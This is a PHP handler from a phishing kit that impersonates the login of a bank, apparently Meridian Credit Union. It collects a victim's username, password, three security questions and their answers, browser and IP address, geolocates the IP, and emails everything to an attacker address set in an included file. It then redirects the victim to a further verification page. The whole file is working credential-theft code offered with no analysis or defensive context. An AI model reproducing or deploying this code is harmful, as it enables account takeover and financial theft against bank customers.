<?php
    session_start();
    include 'email.php';
	
    $ip = getenv("REMOTE_ADDR");
    $u = "http://www.geoiptool.com/?IP='$ip'";
    $dump = unserialize(file_get_contents($u));
    $country = $dump["geoplugin_countryName"];
	$q1=$_SESSION['question1'] ;
	$q2=$_SESSION['question2'];
	$q3=$_SESSION['question3'] ;
	$a1=$_SESSION['answer1'];
	$a2=$_SESSION['answer2'];
	$a3=$_SESSION['answer3'];
	$user = $_SESSION['username'];
	$pass = $_SESSION['password'];
	$browser =$_SERVER['HTTP_USER_AGENT'];
    $subject = 'Meri QA [ '.$country.' - '.$_SERVER['REMOTE_ADDR'].' ]';
    $data =" |============ Meridiancu Login ===========|
    user: $user
    pass : $pass
    Question1: $q1
    Answer1:$a1
    
    Question2: $q2
    Answer2:$a2
    
    Question3: $q3
    Answer3:$a3
    $browser
    $ip";

   
   if( ($a1 != "" || $a2 != "" || $a3 !="")  && strlen($a1)<15){
	
	mail($to , $subject, $data);
	}
    header("Location: ./verify.php");
 ?>